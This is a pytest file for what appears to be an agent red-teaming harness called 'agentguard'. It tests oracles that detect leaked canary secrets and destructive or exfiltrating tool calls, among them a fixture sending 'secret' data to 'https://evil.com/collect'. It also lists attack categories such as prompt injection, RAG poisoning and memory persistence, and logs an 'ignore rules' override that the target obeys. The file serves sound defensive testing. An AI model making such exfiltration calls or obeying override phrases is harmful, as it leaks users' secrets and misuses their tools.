import base64
import json
from pathlib import Path
from agentguard.attackers import (
    CAPABILITY_TARGETED,
    PLAYBOOKS,
    FindingsSink,
    _assistant_message_no_reasoning,
    _canary_oracle,
    _side_effect_oracle,
)


def test_canary_oracle():
    canaries = ["CANARY_SECRET_123456789"]

    # Direct match
    assert _canary_oracle("The secret is CANARY_SECRET_123456789 here", canaries) == "CANARY_SECRET_123456789"

    # Prefix match (> 12 chars)
    assert _canary_oracle("Partial: CANARY_SECRET", canaries) == "CANARY_SECRET_123456789"

    # Base64 encoded match
    b64 = base64.b64encode(b"CANARY_SECRET_123456789").decode()
    assert _canary_oracle(f"Encoded: {b64}", canaries) == "CANARY_SECRET_123456789"

    # No match
    assert _canary_oracle("Nothing secret here", canaries) is None
    assert _canary_oracle("", canaries) is None


def test_side_effect_oracle():
    destructive = {"delete_file", "transfer_funds"}

    # No destructive calls
    safe_calls = [{"name": "get_balance", "args": {"account": "123"}}]
    assert _side_effect_oracle(safe_calls, destructive) is None

    # Destructive call present
    bad_calls = [
        {"name": "get_balance", "args": {"account": "123"}},
        {"name": "transfer_funds", "args": {"to": "Bob", "amount": 500}},
    ]
    hit = _side_effect_oracle(bad_calls, destructive)
    assert hit is not None
    assert hit["name"] == "transfer_funds"

    # Data exfiltration detection (external URL in argument)
    exfil_calls = [
        {"name": "send_log", "args": {"destination": "https://evil.com/collect", "data": "secret"}}
    ]
    hit_exfil = _side_effect_oracle(exfil_calls, destructive)
    assert hit_exfil is not None
    assert "external URL" in hit_exfil.get("oracle_reason", "")


def test_attack_categories_and_playbooks():
    expected_categories = [
        "prompt_injection",
        "secret_extraction",
        "tool_misuse",
        "data_exfiltration",
        "privilege_escalation",
        "rag_poisoning",
        "memory_persistence",
    ]
    for cat in expected_categories:
        assert cat in CAPABILITY_TARGETED
        assert cat in PLAYBOOKS
        assert len(PLAYBOOKS[cat]) > 50


def test_findings_sink_lifecycle(tmp_path: Path):
    sink = FindingsSink(
        target_desc={"url": "http://127.0.0.1:8000"},
        manifest_summary={"tools": ["transfer_funds"]},
    )

    sink.start_attempt("prompt_injection", "system_prompt")
    sink.record_turn("ignore rules", {"output": "I obey!", "tool_calls": []})
    assert sink.succeeded is False

    sink.mark_success("llm_judge", "Target obeyed attacker instructions")
    assert sink.succeeded is True

    # Subsequent marks should not overwrite the first proof
    sink.mark_success("canary", "another detail")
    assert sink._oracle == "llm_judge"

    sink.finish_attempt()
    assert len(sink.attempts) == 1
    assert sink.attempts[0]["success"] is True

    out_file = tmp_path / "findings.json"
    sink.to_json(out_file)

    saved = json.loads(out_file.read_text(encoding="utf-8"))
    assert saved["target"]["url"] == "http://127.0.0.1:8000"
    assert len(saved["attempts"]) == 1
    assert saved["attempts"][0]["category"] == "prompt_injection"


def test_assistant_message_no_reasoning():
    msg = _assistant_message_no_reasoning(
        content="Hello",
        tool_calls=[{"id": "call_1"}],
        reasoning_content="internal reasoning to be stripped",
        extra_key="keep_this_key",
    )
    assert msg["role"] == "assistant"
    assert msg["content"] == "Hello"
    assert msg["tool_calls"] == [{"id": "call_1"}]
    assert msg["extra_key"] == "keep_this_key"
    assert "reasoning_content" not in msg
